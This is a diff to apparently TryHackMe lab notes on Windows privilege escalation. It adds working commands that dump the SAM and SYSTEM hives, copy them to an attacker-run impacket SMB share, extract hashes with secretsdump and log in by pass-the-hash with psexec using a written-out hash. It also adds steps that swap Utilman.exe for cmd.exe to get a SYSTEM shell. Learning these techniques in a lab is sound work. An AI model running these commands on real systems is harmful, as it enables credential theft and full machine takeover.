@@ -248,27 +248,42 @@ sc.exe start "THMService" # powershell
 > [!Note]
 > 🔹 Access Privileges in Windows are licenses that allow a system to do systemic tasks. These licenses can vary from simple (such as off -system shutdown) to very sensitive (such as ignoring security controls).
 
-### Privilege Escalation with The SeBackup and SeRestore privileges allow ✅
+### Privilege Escalation with The SeBackup and SeRestore privileges allow for a user ✅
 
 > [!Note]
 > 🔹 The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.
 ```powershell
-0️⃣ Once on the command prompt, we can check our privileges
+0️⃣ # Once on the command prompt, we can check our privileges
 whoami /priv
-1️⃣ To backup the SAM and SYSTEM hashes, and Extraction of SAM and System Registry Files  
+1️⃣ # To backup the SAM and SYSTEM hashes, and Extraction of SAM and System Registry Files  
 reg save hklm\system C:\Users\THMBackup\system.hive
 reg save hklm\sam C:\Users\THMBackup\sam.hive
-2️⃣ Launch a SMB Server in the hacker system (Kali Linux) with impacket smbserver tools for Transfer the extracted files to the hacker system
+2️⃣ # Launch a SMB Server in the hacker system (Kali Linux) with impacket smbserver.py tools for Transfer the extracted files to the hacker system
 mkdir share
 sudo python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share 
-3️⃣ Transfer files from Windows to Linux
+3️⃣ # Transfer files from Windows to Linux
 copy C:\Users\THMBackup\sam.hive \\10.11.99.141\public\
 copy C:\Users\THMBackup\system.hive \\10.11.99.141\public\
-4️⃣ Extraction of password hashs from registry files with impacket secretsdump tools
+4️⃣ # Extraction of password hashs from registry files with impacket secretsdump.py tools
 sudo python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
-5️⃣ Pass-the-Hash attack to log in as Administrator
+5️⃣ # Pass-the-Hash attack to log in as Administrator with impacket psexec.py tools
+sudo python /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.235.96
+```
 
+### Privilege Escalation with The SeTakeOwnership privilege allows for a user ✅
 
+> [!Note]
+> 🔹 The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.
+```powershell
+0️⃣ # Once on the command prompt, we can check our privileges
+whoami /priv
+1️⃣ # take the ownership of the utilman.exe file 
+takeown /f C:\Windows\System32\Utilman.exe
+2️⃣ # Giving full access to the file
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+3️⃣ Replace utilman.exe with cmd.exe
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
+4️⃣ Now when clicking on the Login page, the "Ease of Access" button opens, instead of access settings, a CMD with System Access Level opens 
 ```
 
 ## Credentials ✅
